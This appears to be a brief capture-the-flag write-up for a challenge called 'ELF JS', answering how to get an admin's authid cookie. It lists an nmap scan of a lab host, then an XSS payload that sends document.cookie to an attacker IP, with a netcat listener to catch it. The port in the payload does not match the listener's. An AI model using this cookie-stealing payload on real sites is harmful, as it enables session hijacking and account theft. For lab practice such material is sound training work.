# ELF JS

1. What is the admin's authid cookie value?
   Ans:
   1. `nmap -sT -sC -sV -O 10.48.175.202`
   2. Register a user at `http://10.48.175.202:3000/`
   3. <script> window.location = ‘http:// 192.168.242.92:4242/page?param=’ + document.cookie </script>
   4. sudo nc -lnvp 80
